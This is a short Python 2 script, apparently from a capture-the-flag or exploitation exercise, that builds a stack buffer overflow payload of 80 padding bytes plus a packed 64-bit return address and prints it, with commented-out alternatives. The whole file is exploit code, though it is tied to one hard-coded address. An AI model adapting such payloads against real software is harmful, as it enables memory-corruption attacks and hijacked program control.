import struct
   
  #variable = 0x4141414141414141
  sys_add = 0x7fffffffdd80
  #exit_add = 0x7ffff761b450
  payload='A'*72+ 'A'*8+struct.pack('<Q',sys_add)  
  #payload = 'A'*80
  print payload

